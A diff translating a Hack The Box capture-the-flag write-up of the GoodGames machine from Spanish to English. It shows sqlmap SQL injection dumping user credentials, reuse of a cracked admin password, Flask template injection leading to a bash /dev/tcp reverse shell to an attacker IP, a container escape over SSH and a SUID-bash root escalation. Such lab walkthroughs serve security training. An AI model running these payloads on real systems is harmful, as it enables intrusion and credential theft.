@@ -1,5 +1,5 @@
 ---
-title:  "Writeup de la máquina GoodGames de Hack The Box"
+title:  "Writeup of GoodGames machine of Hack The Box"
 date: 2023-06-23
 mathjax: true
 layout: post
@@ -7,74 +7,75 @@ categories: writeup
 tags: docker sql-injection nmap port-forwarding sqlmap ssti python flask
 ---
 
-# Resolución de la máquina GoodGames de la plataforma de HackTheBox
+# Resolution of GoodGames machine of Hack The Box
 
 ![](https://i.ibb.co/yqd7tfJ/homepage.png)
 
 ### 🎮 *"¡Hacking is the BEST GAME!"*
 
-**Primeramente hacemos un escaneo de la máquina en búsqueda de puertos abiertos con Nmap:**
+First we scan the machine for open ports with Nmap:
 
 ```bash
 sudo nmap 10.10.11.130 -p- --open --min-rate 5000 -sS -Pn -oG openPorts -vvv 
 ```
 
-Con el comando anterior exportamos el resultado en un formato en el cual podamos extraer los puertos abiertos con la siguente secuencia de comandos:
+With the above command we export the result in a format in which we can extract the open ports with the following sequence of commands:
 
 ```bash
 cat openPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ','
 ```
 
-#### *Hora de realizar el escaneo...*
+#### *Time to perform the scan...*.
 
 ```bash
 sudo nmap 10.10.11.130 -p 80 -sVC -sS -Pn -oN scanNormal -vvv
 ```
 
-#### Explicación del uso de Nmap:
+#### Explanation of the use of Nmap:
 
 ```bash
--p 80 # Especificamos el puerto 80.
--sVC # También '-sV -sC', ejecuta scripts básicos de Nmap y a la vez intenta detectar los servicios de cada puerto.
--sS # Permite escanear velózmente y de forma discreta.
--Pn # No realiza un ping, en vez de eso omite el descubrimiento del host. (En algunos casos es útil para hacer un bypass de alguna capa de firewall o cualquier cosa que bloquee la conexión).
--oN # Exporta el resultado (output) en un formato normal y legible.
--vvv # Para visualizar con mayor detalle lo que sucede durante el escaneo (verbose).
+-p 80   # Specify port 80.
+-sVC    # Also '-sV -sC', runs basic Nmap scripts and at the same time tries to detect the services on each port.
+-sS     # Allows you to scan quickly and unobtrusively.
+-Pn     # Does not perform a ping, instead it skips host discovery (in some cases it is useful to bypass some firewall layer or anything blocking the connection).
+-oN     # Export the output in a normal, readable format.
+-vvv    # To visualize in more detail what happens during the scan (verbose).
 ```
 
-#### Con el escaneo completo obtenemos el siguiente resultado:
+#### With the complete scan we obtain the following result:
 
 ![](https://i.ibb.co/6FsCvWq/scan-Normal.png)
 
 
-#### Vemos el dominio "goodgames.htb", por lo que lo agregamos a nuestro archivo /etc/hosts y procedemos a visitar el sitio.
+#### We see the domain "goodgames.htb", so we add it to our /etc/hosts file and proceed to visit the site.
 
 ```
 10.10.11.130    goodgames.htb
 ```
 
-#### Luego de visitar la página encontramos una sección para autenticarnos con "Email" y "Password":
+#### After visiting the page we find a section to authenticate with "Email" and "Password":
 
 ![](https://i.ibb.co/G5n12gT/homepage.png)
 
-#### En base a esto, procedemos a probar si el inicio de sesión es vulnerable a SQL Injection:
+#### Based on this, we proceed to test if the login is vulnerable to SQL Injection:
 
-Primero capturamos la solicitud (Request) con **Burp Suite** y la guardamos con el nombre "req.txt"
+First we capture the request with **Burp Suite** and save it with the name "req.txt".
 
 ![](https://i.ibb.co/jgM4HPB/req-burpsuite.png)
 
 ### SQL Injection - SQLmap
 
-#### Una vez tenemos el archivo *req.txt* con la solicitud interceptada con Burp Suite, procedemos automatizar un ataque de SQL Injection con SQLmap:
+#### Once we have the *req.txt* file with the request intercepted with Burp Suite, we proceed to automate a SQL Injection attack with SQLmap:
 
-Con el siguiente comando le indicamos a la herramienta SQLmap que utilize el Request del archivo "req.txt" (-r req.txt) y que intente enumerar las bases de datos (--dbs).
-También le indicamos que durante el ataque no nos pregunte cómo ir procediendo (--batch).
+With the following command we tell the SQLmap tool to use the Request of the "req.txt" file (-r req.txt) and to try to enumerate the databases (--dbs).
+
+We also tell it not to ask us how to proceed during the attack (--batch).
 
 ```bash
 sqlmap -r req.txt --batch --dbs
 ```
 
-#### Tenemos suerte, y SQLmap logra encontrar vulnerable el parámetro "email" con una vulnerabilidad a ciegas (Blind) y basada en tiempo (time-based):
+#### We are lucky, and SQLmap manages to find vulnerable the "email" parameter with a blind and time-based vulnerability:
 
 ```
 ---
@@ -85,7 +86,7 @@ Parameter: email (POST)
 ---
 ```
 
-#### Finalmente logra encontrar dos bases de datos ("information_schema" y "main"):
+#### Finally manages to find two databases ("information_schema" and "main"):
 
 ```
 available databases [2]:
@@ -93,13 +94,13 @@ available databases [2]:
 [*] main
 ```
 
-#### Procedemos a investigar qué tablas tiene la base de datos "main":
+#### We proceed to investigate which tables the "main" database has:
 
 ```bash
 sqlmap -r req.txt --batch --dbs -D main --dump
 ```
 
-#### Tablas:
+#### Tables:
 
 - blog
 - blog_comments
@@ -114,28 +115,28 @@ sqlmap -r req.txt --batch --dbs -D main --dump
 [16:16:10] [INFO] resumed: user
 ```
 
-#### Ahora solo queda terminar extraer la información de la tabla "user" de la base de datos "main".
+#### Now we only have to finish extracting the information from the "user" table of the "main" database.
 
 ```bash
 sqlmap -r req.txt -D main -T user --dump --batch
 ```
 
-#### Al intentar crackear los hashes con el diccionario de SQLmap no logramos obtener la contraseña, por lo que quitamos el parámetro "--batch" y le especificamos que vamos a utilizar nuestro diccionario "rockyou.txt".
+#### When we tried to crack the hashes with the SQLmap dictionary we could not get the password, so we remove the "--batch" parameter and specify that we are going to use our dictionary “rockyou.txt”.
 
-### Iniciamos sesión con las siguientes credenciales obtenidas con SQLmap:
+### We log in with the following credentials obtained with SQLmap:
 
 ```yaml
 - email: admin@goodgames.htb
 - password: superadministrator
 ```
 
-#### Una vez en el directorio goodgames.htb/profile vemos en la parte superior un botón que nos lleva a los ajustes aparentemente en la siguiente URL: 
+#### Once in the directory goodgames.htb/profile we see at the top a button that takes us to the settings apparently in the following URL: 
 
 ```
 http://internal-administration.goodgames.htb/
 ```
 
-*Para poder acceder a ese subdominio, lo agregamos al archivo /etc/hosts*
+*To be able to access this subdomain, we add it to the /etc/hosts file.*
 
 ```
 ----------
@@ -144,15 +145,15 @@ http://internal-administration.goodgames.htb/
 10.10.11.130    goodgames.htb internal-administration.goodgames.htb
 ```
 
-#### Una vez ingresado al subdominio, nos encontramos con un panel de login:
+#### Once logged in to the subdomain, you will find a login panel:
 
 ![](https://i.ibb.co/G2jm89p/login-flask.png)
 
-#### Al intentar utilizar la misma contraseña ("superadministrator") con el nombre de usuario "admin", logramos autenticarnos y accedemos al dashboard. *Esto es una falla de seguridad común, por eso está la importancia de siempre usar contraseñas distintas para cada lugar.*
+#### When trying to use the same password ("superadministrator") with the username "admin", we managed to authenticate and access the dashboard. *This is a common security flaw, so it is important to always use different passwords for each location.
 
 ### Server-Side Template Injection (SSTI)
 
-#### Dentro del apartado de Settings, podemos ver que podemos cambiar nuestro nombre, y si analizamos las tecnologías que utiliza la aplicación web, está ejecutando Flask (Python). Por lo que podríamos intentar inyectarle el payload básico de Server-Side Template Injection:
+#### In the Settings section, we can see that we can change our name, and if we analyze the technologies used by the web application, it is running Flask (Python). So we could try to inject the basic Server-Side Template Injection payload:
 
 {% raw %}
 ```python
@@ -162,11 +163,11 @@ http://internal-administration.goodgames.htb/
 
 ![](https://i.ibb.co/jgkzY1Y/ssti-49.png)
 
-#### Ahora que sabemos que es vulnerable a Server-Side Template Injection podemos intentar ejecutar del lado del Servidor (Server-Side) una shell reversa hacia nuestra máquina atacante. 
+#### Now that we know that it is vulnerable to Server-Side Template Injection we can try to run a reverse shell on the Server-Side to our attacking machine. 
 
-##### Sabemos que la app web utiliza Python para el Back-End por lo que podemos revisar el sitio de PayloadAllTheThings y buscar un payload para ejecutar una reverse shell en Python.
+##### We know that the web app uses Python for the Back-End so we can check the PayloadAllTheThings site and look for a payload to run a reverse shell in Python.
 
-##### En un principio podríamos construir entonces nuestro propio payload de la siguiente manera:
+##### Initially we could then build our own payload as follows:
 
 {% raw %}
 ```python
@@ -174,15 +175,15 @@ http://internal-administration.goodgames.htb/
 ```
 {% endraw %}
 
-#### Ahora modificamos la función os.popen('') para que ejecute una shell reversa con Netcat de la siguiete manera:
+#### Now we modify the os.popen('') function to run a reverse shell with Netcat as follows:
 
-*Payload de Netcat:*
+*Payload of Netcat:*
 
 ```bash
 bash -c "bash -i >& /dev/tcp/10.10.14.20/4444 0>&1"
 ```
 
-*Lo ingresamos dentro de la función os.popen()*
+*We enter it into the function os.popen()*.
 
 {% raw %}
 ```python
@@ -190,7 +191,7 @@ bash -c "bash -i >& /dev/tcp/10.10.14.20/4444 0>&1"
 ```
 {% endraw %}
 
-#### Ahora solamente ponemos Netcat a la escucha por el puerto 4444 y ejecutamos el payload anterior dentro del campo vulnerable a SSTI (Server-Side Template Injection) como vimos anteriormente.
+#### Now we just put Netcat listening on port 4444 and execute the previous payload inside the field vulnerable to SSTI (Server-Side Template Injection) as we saw before.
 
 
 ```bash
@@ -199,20 +200,20 @@ nc -lvp 4444
 
 ![](https://i.ibb.co/0mjcbnS/netcat.png)
 
-##### Si miramos nuestra dirección IP del hostname, vemos que al parecer podríamos estar dentro de un contenedor de Docker. Adicionalmente estamos como usuario root dentro de este contenedor.
+##### If we look at our hostname IP address, we see that it appears that we might be inside a Docker container. Additionally we are as root user inside this container.
 
 ### Port Forwarding
 
-#### Primero encontramos la flag de usuario en el directorio $HOME del usuario "augustus":
+#### First we find the user flag in the $HOME directory of the user "augustus":
 
 ```bash
 cd /home/augustus
 cat user.txt
 ```
 
-#### Ahora necesitamos movernos dentro del servidor y pasar fuera del contenedor hacia la máquina local. 
+#### Now we need to move inside the server and move outside the container to the local machine. 
 
-##### Como vimos antes, la contraseña ya se utilizó más de una vez y quizás fuera del contenedor. También puede que exista un usuario "augustus" en la máquina local, por lo que procedemos a intentar conectarnos por SSH desde nuestro host (172.19.0.2) hacia el host 172.19.0.1:
+##### As we saw before, the password has already been used more than once and perhaps outside the container. There may also be a user "augustus" on the local machine, so we proceed to try to connect via SSH from our host (172.19.0.2) to host 172.19.0.1:
 
 ```bash
 ssh augustus@172.19.0.1
@@ -221,7 +222,7 @@ augustus@172.19.0.1's password: superadministrator
 
 ![](https://i.ibb.co/Hpq30pf/ssh-augustus.png)
 
-#### Al ejecutar "hostname -I" vemos que ya estamos dentro del host local por la dirección IP de la máquina (10.10.11.130):
+#### By executing "hostname -I" we can see that we are already inside the local host by the machine's IP address (10.10.11.130):
 
 ```bash
 augustus@GoodGames:~$ hostname -I
@@ -230,24 +231,24 @@ hostname -I
 augustus@GoodGames:~$
 ```
 
-### Escalación de Privilegios
+### Privilege Escalation 
 
-##### *Explicación*: Tenemos que tener en cuenta que dentro del contenedor somos usuario root, pero dentro del host local de la máquina somos usuarios sin privilegios. 
+##### *Explanation*: We have to keep in mind that inside the container we are root user, but inside the local host machine we are unprivileged users. 
 
-##### En base a esto hay algo muy simple que podemos hacer que es copiar el binario "bash" desde la máquina local hacia nuestro directorio $HOME y desde el contenedor como usuario root modificar los privilegios para luego usarlo y ejecutar "./bash -p" y escalar el privilegio a root desde el host local de la máquina.
+##### Based on this there is something very simple that we can do which is to copy the "bash" binary from the local machine to our $HOME directory and from the container as root user modify the privileges and then use it to execute "./bash -p" and escalate the privilege to root from the local host of the machine.
 
-#### Una vez planeado nuestro ataque:
+#### Once our attack is planned:
 
-- Nos conectamos por SSH:
+- We connect via SSH:
 
 ```bash
 ssh augustus@172.19.0.1
 augustus@172.19.0.1's password: superadministrator
 ```
 
-- Copiamos el binario /bin/bash hacia /home/augustus/bash
+- Copy the binary /bin/bash to /home/augustus/bash
 
-- Volvemos al contenedor y modificamos los permisos:
+- We go back to the container and modify the permissions:
 
 ```bash
 root@3a453ab39d3d:/home/augustus# chown root:root bash
@@ -265,7 +266,7 @@ total 1212
 root@3a453ab39d3d:/home/augustus#
 ```
 
-- Nuevamente por SSH nos conectamos al host local de la máquina con el usuario augustus y ejecutamos "./bash -p"
+- Again via SSH we connect to the local host of the machine with the user augustus and execute "./bash -p".
 
 ```bash
 augustus@GoodGames:~$ ./bash -p
@@ -276,9 +277,9 @@ root
 bash-5.1#
 ```
 
-### 🎉 Y Listo!!! 🎉
+### 🎉 PWNED!!! 🎉
 
-#### Obtenemos la flag de root en /root/root.txt y completamos la máquina con acceso total al sistema!!
+#### Get the root flag in /root/root.txt and complete the machine with full access to the system!!!
 
 Happy Hacking!!
 
